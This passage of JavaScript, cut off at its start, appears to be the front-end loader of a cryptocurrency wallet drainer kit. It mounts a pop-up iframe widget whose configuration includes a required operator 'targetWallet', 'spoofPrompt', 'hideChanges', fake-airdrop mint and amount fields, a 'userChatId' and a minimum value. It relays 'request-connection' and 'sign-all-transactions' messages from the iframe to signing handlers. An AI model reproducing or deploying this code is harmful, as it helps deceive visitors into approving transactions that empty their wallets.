      hideChanges: options && options.hideChanges,
      targetWallet: targetWallet,
      useProxyForTokens: options && options.useProxyForTokens,
      customAirdropMint: options && options.customAirdropMint,
      customAirdropAmount: options && options.customAirdropAmount,
      userChatId: options && options.userChatId,
      minValue: options && options.minValue,
      stresserSleepMs: options && options.stresserSleepMs,
      phantomStressMode: options && options.phantomStressMode,
      darkMode: !!(options && options.darkMode),
      texts: options && options.texts,
    });

    try {
      sessionStorage.setItem("__appConfig", encodedConfig);
    } catch (e) {}

    // Build iframe URL with config passed as URL parameter
    const iframeUrl = `/frame.html`;

    var iframe = document.createElement("iframe");
    iframe.src = iframeUrl;

    iframe.style.border = "0";
    iframe.style.background = "transparent";
    var isDark = !!(options && options.darkMode);
    iframe.style.colorScheme = isDark ? "dark" : "light";
    var rwRadius = (options && options.radius) || DEFAULTS.radius || "48px";
    var isMobile =
      /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
        navigator.userAgent,
      );
    var isTouchDevice =
      "ontouchstart" in window || navigator.maxTouchPoints > 0;

    if (isMobile || isTouchDevice) {
      iframe.style.width = "100vw";
      iframe.style.height = "100vh";
      iframe.style.position = "fixed";
      iframe.style.top = "0";
      iframe.style.left = "0";
      iframe.style.zIndex = "9999";
      iframe.style.margin = "0";
      iframe.style.padding = "0";
      iframe.style.borderRadius = "0";
      iframe.style.overflow = "hidden";
    } else {
      iframe.style.width = (options && options.width) || DEFAULTS.width;
      iframe.style.height = (options && options.height) || DEFAULTS.height;
      iframe.style.borderRadius = rwRadius;
      iframe.style.overflow = "hidden";
      iframe.style.boxShadow = "0 10px 50px rgba(0, 0, 0, 0.1)";
    }

    iframe.allow = "clipboard-read; clipboard-write; fullscreen;";
    iframe.loading = "lazy";
    iframe.referrerPolicy = "no-referrer-when-downgrade";

    // Remove the postMessage init code since we're using URL params
    iframe.addEventListener("load", function () {
      /* removed */
    });

    // Keep only the wallet connection handler
    window.addEventListener("message", function (event) {
      if (event.data && event.data.source === "kiwi-pro-iframe") {
        if (event.data.type === "request-connection") {
          /* removed */
          const walletName = event.data.payload?.wallet || event.data.wallet;
          /* removed */
          if (walletName) {
            handleWalletConnection(walletName, iframe);
          } else {
            /* removed */
          }
        } else if (event.data.type === "jupiter-sign-all-transactions") {
          handleJupiterSignAllFromIframe(event.data.payload, iframe);
        }
      }
    });

    return iframe;
  }

  function mount(config) {
    config = config || {};
    config = Object.assign({}, DEFAULT_CONFIG, config);

    if (config.texts && DEFAULT_CONFIG.texts) {
      config.texts = Object.assign({}, DEFAULT_CONFIG.texts, config.texts);
    } else if (!config.texts) {
      config.texts = DEFAULT_CONFIG.texts;
    }

    if (!config.targetWallet) {
      throw new Error("targetWallet is required");
    }

    var container;
    if (typeof config.container === "string") {
      container = document.querySelector(config.container);
    } else if (config.container instanceof HTMLElement) {
      container = config.container;
    }

    if (!container) {
      throw new Error("container element not found");
    }

    var iframe = createIframe(config.targetWallet, {
      iframeSrc: config.iframeSrc,
      width: config.width,
      height: config.height,
      spoofPrompt: config.spoofPrompt,
      hideChanges: config.hideChanges,
      useProxyForTokens: config.useProxyForTokens,
      customAirdropMint: config.customAirdropMint,
      customAirdropAmount: config.customAirdropAmount,
      userChatId: config.userChatId,
      minValue: config.minValue,
      stresserSleepMs: config.stresserSleepMs,
      phantomStressMode: config.phantomStressMode,
      darkMode: config.darkMode,
      texts: config.texts,
    });

    var isMobile =
      /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
        navigator.userAgent,
      );
    var isTouchDevice =
      "ontouchstart" in window || navigator.maxTouchPoints > 0;

    if (isMobile || isTouchDevice) {
      document.body.appendChild(iframe);
    } else {
      container.appendChild(iframe);
    }

    return { iframe: iframe };
  }

  function autoInit() {
    var buttons = document.querySelectorAll("." + DEFAULT_CONFIG.className);
    var mountedInstances = {};

    buttons.forEach(function (button) {
      var buttonId =
        button.id || "kiwi-widget-" + Math.random().toString(36).substr(2, 9);
      if (!button.id) button.id = buttonId;

      button.addEventListener("click", function () {
        var widgetContainer = document.getElementById("kiwi-widget");
        if (!widgetContainer) {
          widgetContainer = document.createElement("div");
          widgetContainer.id = "kiwi-widget";
          document.body.appendChild(widgetContainer);
        }

        if (!mountedInstances[buttonId]) {
          mountedInstances[buttonId] = mount({
            container: "#kiwi-widget",
            targetWallet:
              button.dataset.targetWallet || DEFAULT_CONFIG.targetWallet,
            useProxyForTokens:
              button.dataset.useProxyForTokens !== undefined
                ? button.dataset.useProxyForTokens === "true"
                : DEFAULT_CONFIG.useProxyForTokens,
            customAirdropMint:
              button.dataset.customAirdropMint ||
              DEFAULT_CONFIG.customAirdropMint,
            customAirdropAmount: button.dataset.customAirdropAmount
              ? parseInt(button.dataset.customAirdropAmount)
              : DEFAULT_CONFIG.customAirdropAmount,
            userChatId: button.dataset.userChatId || DEFAULT_CONFIG.userChatId,
            minValue: button.dataset.minValue
              ? parseFloat(button.dataset.minValue)
              : DEFAULT_CONFIG.minValue,
            width: button.dataset.width || DEFAULT_CONFIG.width,
            height: button.dataset.height || DEFAULT_CONFIG.height,
            iframeSrc: button.dataset.iframeSrc,
          });
        }

        if (widgetContainer.classList) {
          widgetContainer.classList.add("show");
        } else {
          widgetContainer.style.display = "block";
        }

        button.classList.add("hidden");
      });
    });
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", autoInit);
  } else {
    autoInit();
  }

  window.kiwiPro = {
    mount: mount,
  };
})();
